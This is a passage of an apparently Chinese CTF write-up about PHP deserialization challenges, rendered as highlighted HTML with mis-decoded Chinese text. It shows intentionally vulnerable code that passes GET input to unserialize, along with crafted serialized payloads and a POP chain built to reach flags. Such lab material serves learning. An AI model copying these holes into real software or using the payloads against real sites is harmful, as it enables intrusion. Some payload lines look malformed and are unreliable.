<span class=\"keyword\">die</span>(<span class=\"string\">&quot;NONONO!&quot;</span>);</span><br><span class=\"line\">Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Â <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>è§£æ<br>\nè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¼šåŒ¹é…ä¸€ä¸ªä»¥ o æˆ–è€… c å¼€å¤´åŠ ä¸€ä¸ªï¼šåé¢æ˜¯ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°å­—ï¼Œå†æ¥ç€ä¸€ä¸ªï¼šçš„ä¸åŒºåˆ†å¤§å°å†™çš„æ ¼å¼<br>\n<mark>æ›´å¤šå…³äºæ­£åˆ™è¡¨è¾¾å¼çš„çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« </mark><a href=\"https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/\">æ­£åˆ™å­¦ä¹ </a><br>\næˆ‘ä»¬è¦ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŠ ä¸€ä¸ª + å°±è¡Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:?tryhackme=O:+5:&quot;funny&quot;:()&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">urlç¼–ç :?tryhackme=O%3A%2B5%3A%22funny%22%3A0%3A%7B%7D</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"3\"><a class=\"markdownIt-Anchor\" href=\"#3\">#</a> 3.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag3.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">Â  Â  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">global</span> <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password === <span class=\"variable language_\">$this</span>-&gt;verify) &#123;</span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Ã¤Â½ Ã¤Â¸â€¢Ã¥Â¤ÂªÃ¨Â¡Å’Ã¥â€¢Å ??!&quot;</span>;</span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">Â  Â  <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œ password çš„å€¼è¢«æ”¹æˆäº†ä¸€ä¸ªä¸çŸ¥é“çš„å€¼ï¼Œå¯ä»¥æ„é€ å…±æœ‰åœ°å€<br>\nçœ‹ä¸ªä¾‹å­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span> php</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;ABC&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$b</span> =&amp;<span class=\"variable\">$a</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//è¿™é‡Œè¾“å‡º:ABC </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//è¿™é‡Œè¾“å‡º:ABC </span></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;EFG&quot;</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//è¿™é‡Œ$açš„å€¼å˜ä¸ºEFG æ‰€ä»¥è¾“å‡ºEFG </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//è¿™é‡Œè¾“å‡ºEFG</span></span><br></pre></td></tr></table></figure>\n<p>æ„é€ :</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$verify</span>=&amp;<span class=\"variable\">$password</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funny</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.O:5:&quot;funny&quot;:2:&#123;s:6:&quot;verify&quot;;N;s:15:&quot;funnypassword&quot;;N;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.\\00funny\\00password</span><br><span class=\"line\">3.%00funny%00password</span><br></pre></td></tr></table></figure>\n<p>æˆ–è€…è®© <code>$password=$verify</code>  ä¸€æ ·çš„éƒ½å¯ä»¥</p>\n<h2 id=\"4\"><a class=\"markdownIt-Anchor\" href=\"#4\">#</a> 4.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"5\"><a class=\"markdownIt-Anchor\" href=\"#5\">#</a> 5.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a = <span class=\"string\">&quot;givemeflag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;a === <span class=\"string\">&quot;givemeflag&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$a</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &lt; <span class=\"number\">32</span> || <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$a</span>[<span class=\"variable\">$i</span>]) &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Ã¤Â½ Ã¥Ë†Â°Ã¥Âºâ€¢Ã¨Â¡Å’Ã¤Â¸â€¢Ã¨Â¡Å’Ã¥â€¢Å &quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>åªè¦å‘åºåˆ—åŒ–å $a=&quot;givemeflag&quot; å°±è¡Œäº†<br>\nè„šæœ¬å¤ªç®€å•äº†ç›´æ¥æ”¾ payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:5:&quot;funny&quot;:1:&#123;s:8:&quot;\\00funny\\00a&quot;;s:10:&quot;givemeflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6\"><a class=\"markdownIt-Anchor\" href=\"#6\">#</a> 6.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag6.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pyflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æ­¤é¢˜æ²¡æœ‰é­”æœ¯æ–¹æ³•æ— æ³•è¿›å…¥ç±»ä¸­è°ƒç”¨ç±»ä¸­æ–¹æ³•ï¼Œåªèƒ½æ„é€ ä¸€ä¸ªå€¼ä¸º pyflag çš„å­—ç¬¦ä¸²ï¼Œé‡Œé¢è¿˜å¾—æœ‰å®ä¾‹åŒ– (ç©ºç±»å­—ç¬¦ä¸²)<br>\n çœ‹ä¸ªä¾‹å­:<br>\n![[Pasted image 20230427220851.png]]</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"> </span>&#123;</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&#x27;pyflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> funny;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$a</span>,<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"7\"><a class=\"markdownIt-Anchor\" href=\"#7\">#</a> 7.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag2.php&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">a</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$object</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">array_walk</span>(<span class=\"variable\">$this</span>, function (<span class=\"variable\">$fn</span>, <span class=\"variable\">$prev</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fn</span>[<span class=\"number\">0</span>] === <span class=\"string\">&quot;system&quot;</span> &amp;&amp; <span class=\"variable\">$prev</span> === <span class=\"string\">&quot;ls&quot;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Wow, you rce me! But I can&#x27;t let you do this. There is the flag. Enjoy it:)\\n&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        @<span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"title function_ invoke__\">add</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">object</span>-&gt;<span class=\"keyword\">string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">b</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addMe</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Add Failed. Filename:&quot;</span> . <span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$args</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>([<span class=\"variable\">$this</span>, <span class=\"variable\">$func</span> . <span class=\"string\">&quot;Me&quot;</span>], <span class=\"variable\">$args</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">c</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">string</span> = <span class=\"variable\">$string</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$var</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$var</span>[<span class=\"variable\">$name</span>]();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;tryhackme&quot;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ç›®æ ‡:a çš„ resolve, æ¥å£ c::__get, ç„¶å a::__tostring, ç„¶å b çš„ addMe,b çš„__call,a çš„ destruct<br>\npop:<br>\na::destruct-&gt;b::call-&gt;b::addMe-&gt;a::toString-&gt;c:get-&gt;a::get<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å‰é¢ç…§æŠ„</span><br><span class=\"line\">$a=new a();</span><br><span class=\"line\">$a-&gt;object=new b();</span><br><span class=\"line\">$a-&gt;object-&gt;filename=new a();</span><br><span class=\"line\">$a-&gt;object-&gt;filename-&gt;object=new c([&#x27;string&#x27;=&gt;[new A(),&quot;resolve&quot;]]);</span><br><span class=\"line\">å‘ç°ä¸€ä¸ªæŠ¥é”™,filenameæ˜¯protectå±æ€§ç¬¬ä¸‰æ­¥è¿›è¡Œä¸äº†,äºæ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å…¶å†…éƒ¨</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span 